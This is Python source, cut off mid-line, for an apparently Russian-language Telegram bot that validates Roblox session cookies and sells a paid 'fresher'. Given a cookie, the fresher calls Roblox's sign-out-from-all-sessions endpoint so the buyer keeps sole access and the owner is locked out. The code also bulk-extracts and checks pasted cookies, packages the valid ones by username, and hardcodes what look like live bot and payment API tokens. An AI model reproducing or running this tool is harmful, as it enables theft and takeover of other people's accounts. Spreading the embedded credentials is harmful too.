import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"
ADMIN_USERNAME = "@pirkw"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–≤–æ–π—Å–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã —Ñ—Ä–µ—à–µ—Ä–∞"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'–û–ø–ª–∞—Ç–∞ —Ñ—Ä–µ—à–µ—Ä–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 86400,
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"–û—à–∏–±–∫–∞ API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∏–Ω–≤–æ–π—Å–∞: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –∏–Ω–≤–æ–π—Å–∞"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "–ò–Ω–≤–æ–π—Å –Ω–µ –Ω–∞–π–¥–µ–Ω"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.premium_users = {}
        self.crypto_payment = CryptoPayment()
        self.fresher_price = 1.0
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"‚ö†Ô∏è Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"‚ö†Ô∏è Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def activate_premium(self, user_id):
        """–ê–∫—Ç–∏–≤–∞—Ü–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–µ—à–µ—Ä—É"""
        self.premium_users[user_id] = {
            'activated_date': datetime.now(),
            'is_active': True,
            'payment_method': 'cryptobot'
        }

    def check_premium_access(self, user_id):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–µ—à–µ—Ä—É"""
        return user_id in self.premium_users and self.premium_users[user_id]['is_active']

    def extract_cookies_from_text(self, text):
        """–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫—É–∫–∏ –∏–∑ —Ç–µ–∫—Å—Ç–∞ - –£–õ–£–ß–®–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø"""
        cookies = []
        
        # –£–ª—É—á—à–µ–Ω–Ω—ã–π –ø–∞—Ç—Ç–µ—Ä–Ω –¥–ª—è –ø–æ–∏—Å–∫–∞ –∫—É–∫–∏
        patterns = [
            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=\-|\.]+',
            r'_\|WARNING:-DO-NOT-SHARE-THIS[^\\s]+',
            r'ROBLOSECURITY=[A-Za-z0-9+/=\-|\.]+'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                cookie_candidate = match.strip()
                # –§–∏–ª—å—Ç—Ä—É–µ–º –ø–æ –¥–ª–∏–Ω–µ –∏ —Å–æ–¥–µ—Ä–∂–∞–Ω–∏—é
                if len(cookie_candidate) > 100 and ('WARNING' in cookie_candidate or 'ROBLOSECURITY' in cookie_candidate):
                    # –û—á–∏—â–∞–µ–º –æ—Ç –ª–∏—à–Ω–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
                    clean_cookie = re.sub(r'^[üç™üîêüçÉ]\s*', '', cookie_candidate)
                    clean_cookie = re.sub(r'^[Cc]ookie:\s*', '', clean_cookie)
                    clean_cookie = clean_cookie.strip()
                    
                    if clean_cookie not in cookies:
                        cookies.append(clean_cookie)
                        print(f"üîç –ù–∞–π–¥–µ–Ω–∞ –∫—É–∫–∏: {clean_cookie[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def refresh_cookie_properly(self, cookie_data):
        """–ü—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ—Ä–µ—à–µ—Ä –∫—É–∫–∏ - –≤—ã–∫–∏–¥—ã–≤–∞–µ—Ç –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
        try:
            # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—É–∫–∏ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –∑–∞–ø—Ä–æ—Å–µ
            if not cookie_data.startswith('.ROBLOSECURITY='):
                cookie_string = f'.ROBLOSECURITY={cookie_data}'
            else:
                cookie_string = cookie_data
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_string,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-CSRF-TOKEN': 'fetch'  # –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω
            }
            
            # –®–∞–≥ 1: –ü–æ–ª—É—á–∞–µ–º CSRF —Ç–æ–∫–µ–Ω
            token_response = requests.post(
                'https://auth.roblox.com/v2/logout',
                headers=headers,
                timeout=10
            )
            
            # –ò–∑–≤–ª–µ–∫–∞–µ–º CSRF —Ç–æ–∫–µ–Ω –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
            csrf_token = None
            if 'x-csrf-token' in token_response.headers:
                csrf_token = token_response.headers['x-csrf-token']
            
            if not csrf_token:
                # –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞
                token_response = requests.post(
                    'https://www.roblox.com/authentication/signoutfromallsessions',
                    headers=headers,
                    timeout=10
                )
                if 'x-csrf-token' in token_response.headers:
                    csrf_token = token_response.headers['x-csrf-token']
            
            if not csrf_token:
                return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å CSRF —Ç–æ–∫–µ–Ω"
            
            # –®–∞–≥ 2: –í—ã—Ö–æ–¥–∏–º —Å–æ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π (–≤—ã–∫–∏–¥—ã–≤–∞–µ–º –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
            headers['X-CSRF-TOKEN'] = csrf_token
            
            logout_response = requests.post(
                'https://www.roblox.com/authentication/signoutfromallsessions',
                headers=headers,
                timeout=10
            )
            
            if logout_response.status_code in [200, 403]:
                # –®–∞–≥ 3: –ü–æ–ª—É—á–∞–µ–º –Ω–æ–≤—É—é –∫—É–∫–∏
                # –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å –∫ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É —ç–Ω–¥–ø–æ–∏–Ω—Ç—É —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é
                session_response = requests.get(
                    'https://users.roblox.com/v1/users/authenticated',
                    headers=headers,
                    timeout=10
                )
                
                # –ò—â–µ–º –Ω–æ–≤—É—é –∫—É–∫–∏ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö
                if 'set-cookie' in session_response.headers:
                    new_cookies = session_response.headers['set-cookie']
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        return True, new_cookie, "‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞! –í—Å–µ –¥—Ä—É–≥–∏–µ —Å–µ—Å—Å–∏–∏ –∑–∞–∫—Ä—ã—Ç—ã."
                
                # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ - –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ç–µ–∫—É—â—É—é –∫—É–∫–∏ (–æ–Ω–∞ —É–∂–µ –æ–±–Ω–æ–≤–∏–ª–∞—Å—å)
                return True, cookie_data, "‚úÖ –°–µ—Å—Å–∏–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã! –í—Å–µ –¥—Ä—É–≥–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –≤—ã–∫–∏–Ω—É—Ç—ã."
            
            return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å —Å–µ—Å—Å–∏–∏"
            
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ —Ñ—Ä–µ—à–µ—Ä–∞: {e}")
            return False, cookie_data, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

    def simple_cookie_validation(self, cookie_data):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏"""
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = requests.get(api_url, headers=headers, timeout=10)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
            
            return False, cookie_clean, "‚ùå INVALID - Cannot authenticate", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: {e}")
            return False, cookie_clean, f"‚ùå ERROR - {str(e)}", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö –∫—É–∫–∏"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"üîç –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "‚ùå –í —Ç–µ–∫—Å—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–π –∫—É–∫–∏"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"üîç –ü—Ä–æ–≤–µ—Ä—è—é –∫—É–∫–∏ {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"‚úÖ {i}/{total}: {username} - Valid")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"‚ùå {i}/{total}: Invalid")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def get_command_keyboard(self):
        """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–æ–º–∞–Ω–¥–∞–º–∏"""
        keyboard = [
            [InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫—É–∫–∏", callback_data="check_cookies")],
            [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="show_stats")],
            [InlineKeyboardButton("üîÑ –§—Ä–µ—à–µ—Ä –∫—É–∫–∏", callback_data="fresher_info")],
            [InlineKeyboardButton("‚ÑπÔ∏è –ü–æ–º–æ—â—å", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞"""
    menu_text = """
ü§ñ –ë–û–¢ –ü–†–û–í–ï–†–ö–ò ROBLOX –ö–£–ö–ò

üéØ –î–æ—Å—Ç—É–ø–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:

üîç –ü–†–û–í–ï–†–ö–ê –ö–£–ö–ò - –ë–ï–°–ü–õ–ê–¢–ù–û
‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏
‚Ä¢ –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
‚Ä¢ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞

üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - 1 USDT
‚Ä¢ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏ –∏ –≤—ã–∫–∏–¥—ã–≤–∞–Ω–∏–µ –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –≤–∞–º
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–≤–µ–∂—É—é –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏

üí° –ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ –¥–ª—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏!
    """
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )
    else:
        await update.edit_message_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )

async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ñ—Ä–µ—à–µ—Ä–µ"""
    user_id = update.effective_user.id
    has_premium = checker.check_premium_access(user_id)
    
    if has_premium:
        fresher_text = """
üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - –ê–ö–¢–ò–í–ï–ù ‚úÖ

‚ö° –í–∞—à —Ñ—Ä–µ—à–µ—Ä –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!

–ß—Ç–æ –¥–µ–ª–∞–µ—Ç —Ñ—Ä–µ—à–µ—Ä:
‚Ä¢ –í—ã–∫–∏–¥—ã–≤–∞–µ—Ç –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –≤–∞–º
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–≤–µ–∂—É—é –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏
‚Ä¢ –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –µ–¥–∏–Ω–æ–ª–∏—á–Ω—ã–π –¥–æ—Å—Ç—É–ø

–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:
1. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
2. –ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–∂–º–∏—Ç–µ "üîÑ –û–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏"
3. –ü–æ–ª—É—á–∏—Ç–µ –Ω–æ–≤—É—é –∫—É–∫–∏ —Ñ–∞–π–ª–æ–º
        """
        keyboard = [
            [InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫—É–∫–∏", callback_data="check_cookies")],
            [InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")]
        ]
    else:
        fresher_text = """
üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - 1 USDT

üî• –ú–û–©–ù–´–ô –§–†–ï–®–ï–† –ö–£–ö–ò:

–ß—Ç–æ –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ:
‚Ä¢ –í—ã–∫–∏–¥—ã–≤–∞–µ—Ç–µ –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç–µ –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ —Å–µ–±–µ
‚Ä¢ –ü–æ–ª—É—á–∞–µ—Ç–µ —Å–≤–µ–∂—É—é –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏
‚Ä¢ –ì–∞—Ä–∞–Ω—Ç–∏—è —Ä–∞–±–æ—Ç—ã –∏–ª–∏ –≤–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤

üíé –°—Ç–æ–∏–º–æ—Å—Ç—å: 1 USDT (‚âà75‚ÇΩ)

‚ö° –†–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å –≤–∞–ª–∏–¥–Ω—ã–º–∏ –∫—É–∫–∏!
        """
        keyboard = [
            [InlineKeyboardButton("üíé –ö—É–ø–∏—Ç—å —Ñ—Ä–µ—à–µ—Ä –∑–∞ 1 USDT", callback_data="buy_fresher")],
            [InlineKeyboardButton("üîç –ë–µ—Å–ø–ª–∞—Ç–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞", callback_data="check_cookies")],
            [InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message'):
        await update.message.reply_text(fresher_text, reply_markup=reply_markup)
    else:
        await update.edit_message_text(fresher_text, reply_markup=reply_markup)

async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """–°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–≤–æ–π—Å–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã —Ñ—Ä–µ—à–µ—Ä–∞"""
    amount = checker.fresher_price
    
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description="–î–æ—Å—Ç—É–ø –∫ —Ñ—Ä–µ—à–µ—Ä—É –∫—É–∫–∏ - –≤—ã–∫–∏–¥—ã–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
üíé –û–ü–õ–ê–¢–ê –§–†–ï–®–ï–†–ê

–°—É–º–º–∞: {amount} USDT (‚âà75‚ÇΩ)
–°–µ—Ç—å: TRC-20 (Tron)

‚ö° –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –≤—ã –ø–æ–ª—É—á–∏—Ç–µ:
‚Ä¢ –î–æ—Å—Ç—É–ø –∫ –º–æ—â–Ω–æ–º—É —Ñ—Ä–µ—à–µ—Ä—É
‚Ä¢ –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤—ã–∫–∏–¥—ã–≤–∞—Ç—å –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
‚Ä¢ –°–≤–µ–∂–∏–µ –≤–∞–ª–∏–¥–Ω—ã–µ –∫—É–∫–∏
‚Ä¢ –ì–∞—Ä–∞–Ω—Ç–∏—è —Ä–∞–±–æ—Ç—ã

–î–ª—è –æ–ø–ª–∞—Ç—ã:
1. –ù–∞–∂–º–∏—Ç–µ "–ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ"
2. –û–ø–ª–∞—Ç–∏—Ç–µ {amount} USDT
3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç {ADMIN_USERNAME}
4. –ü–æ–ª—É—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ —Ñ—Ä–µ—à–µ—Ä—É!
        """
        
        keyboard = [
            [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ", url=invoice_url)],
            [InlineKeyboardButton("üì∏ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
            [InlineKeyboardButton("üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="fresher_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if hasattr(update, 'message'):
            await update.message.reply_text(payment_text, reply_markup=reply_markup)
        else:
            await update.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        error_text = f"""
‚ùå –û–®–ò–ë–ö–ê –°–û–ó–î–ê–ù–ò–Ø –°–ß–ï–¢–ê

–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å—á–µ—Ç –¥–ª—è –æ–ø–ª–∞—Ç—ã.
–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å {ADMIN_USERNAME}

–û—à–∏–±–∫–∞: {result}
        """
        await update.edit_message_text(error_text)

async def send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏"""
    has_premium = checker.check_premium_access(user_id)
    
    summary = f"""
üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ü–†–û–í–ï–†–ö–ò:

‚Ä¢ –í—Å–µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {len(valid_cookies) + len(invalid_cookies)}
‚Ä¢ ‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {len(valid_cookies)}
‚Ä¢ ‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {len(invalid_cookies)}
‚Ä¢ üìä –£—Å–ø–µ—Ö: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

{'üíé –°—Ç–∞—Ç—É—Å: –§—Ä–µ—à–µ—Ä –¥–æ—Å—Ç—É–ø–µ–Ω' if has_premium else 'üí° –§—Ä–µ—à–µ—Ä: 1 USDT'}
    """
    
    keyboard = [
        [InlineKeyboardButton("üìÅ –†–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ —Ñ–∞–π–ª–∞–º", callback_data="distribute_files")],
        [InlineKeyboardButton("üì¶ –°–∫–∞—á–∞—Ç—å –æ–±—â–∏–π —Ñ–∞–π–ª", callback_data="download_combined")]
    ]
    
    if has_premium and valid_cookies:
        keyboard.append([InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏", callback_data="refresh_cookies")])
    elif valid_cookies:
        keyboard.append([InlineKeyboardButton("üíé –ö—É–ø–∏—Ç—å —Ñ—Ä–µ—à–µ—Ä –∑–∞ 1 USDT", callback_data="buy_fresh
